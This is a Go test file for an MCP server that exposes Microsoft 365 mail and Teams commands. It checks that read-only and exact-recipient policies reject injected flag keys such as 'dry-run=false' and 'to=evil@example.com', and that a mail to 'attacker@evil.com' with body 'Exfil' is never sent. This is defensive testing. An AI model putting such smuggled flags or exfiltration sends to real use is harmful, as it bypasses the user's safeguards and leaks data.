package cli

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/masonhuemmer/m365/internal/adapters/graph"
	"github.com/modelcontextprotocol/go-sdk/mcp"
)

func TestMCPPolicyRejectsFlagKeyInjection(t *testing.T) {
	d, _, _ := testDeps()
	loginAll(t, &d)
	ctx := context.Background()
	t1, t2 := mcp.NewInMemoryTransports()
	ss, err := NewMCPServerWithPolicy(d, MCPPolicy{ReadOnly: true, ExactRecipients: true, Allow: map[string]bool{}}).Connect(ctx, t1, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer ss.Close()
	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "1"}, nil).Connect(ctx, t2, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer cs.Close()
	for _, tc := range []struct {
		name, namespace string
		flags           map[string]any
	}{
		{"dry run override", "mail", map[string]any{"dry-run=false": true, "to": "x@example.com", "subject": "s", "body": "b"}},
		{"exact recipient override", "teams", map[string]any{"to": "ajay@example.co", "text": "x", "exact-recipient=false": true}},
		{"recipient smuggling", "mail", map[string]any{"to": "approved@example.com", "to=evil@example.com": true, "subject": "s", "body": "b"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			res, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "m365_run", Arguments: runIn{Namespace: tc.namespace, Verb: "send", Flags: tc.flags}})
			if err != nil || !res.IsError || !strings.Contains(toolText(t, res), "unknown flag") {
				t.Fatalf("injected key was not rejected: %v, %v", err, res)
			}
		})
	}
	if got := len(d.Mail.(graph.MailAPI).Memory.Sent); got != 0 {
		t.Fatalf("mail sent despite rejection: %d", got)
	}
	if got := len(d.Teams.(graph.TeamsAPI).Memory.Sent); got != 0 {
		t.Fatalf("teams message sent despite rejection: %d", got)
	}
}

func TestMCPReadOnlyDoesNotSendWhenFlagValueLooksGlobal(t *testing.T) {
	d, _, _ := testDeps()
	loginAll(t, &d)
	ctx := context.Background()
	t1, t2 := mcp.NewInMemoryTransports()
	ss, err := NewMCPServerWithPolicy(d, MCPPolicy{ReadOnly: true, Allow: map[string]bool{}}).Connect(ctx, t1, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer ss.Close()
	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "1"}, nil).Connect(ctx, t2, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer cs.Close()
	res, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "m365_run", Arguments: runIn{
		Namespace: "mail", Verb: "send", Flags: map[string]any{
			"to": "attacker@evil.com", "subject": "Invoice", "body": "Exfil", "cc": "--json",
		},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if res.IsError {
		t.Fatalf("expected a dry-run preview: %s", toolText(t, res))
	}
	var preview struct {
		DryRun bool `json:"dry_run"`
	}
	if err := json.Unmarshal([]byte(toolText(t, res)), &preview); err != nil {
		t.Fatal(err)
	}
	if !preview.DryRun {
		t.Fatalf("expected dry-run preview: %s", toolText(t, res))
	}
	if got := len(d.Mail.(graph.MailAPI).Memory.Sent); got != 0 {
		t.Fatalf("mail sent without write opt-in: %d", got)
	}
}

func TestMCPReadOnlyRejectsBooleanValueForStringFlag(t *testing.T) {
	d, _, _ := testDeps()
	loginAll(t, &d)
	ctx := context.Background()
	t1, t2 := mcp.NewInMemoryTransports()
	ss, err := NewMCPServerWithPolicy(d, MCPPolicy{ReadOnly: true}).Connect(ctx, t1, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer ss.Close()
	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "1"}, nil).Connect(ctx, t2, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer cs.Close()
	res, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "m365_run", Arguments: runIn{
		Namespace: "mail", Verb: "send", Flags: map[string]any{
			"to": "attacker@evil.com", "subject": "Invoice", "body": "Exfil", "cc": true,
		},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError {
		t.Fatalf("expected boolean value for cc to be rejected: %s", toolText(t, res))
	}
	if got := len(d.Mail.(graph.MailAPI).Memory.Sent); got != 0 {
		t.Fatalf("mail sent without write opt-in: %d", got)
	}
}
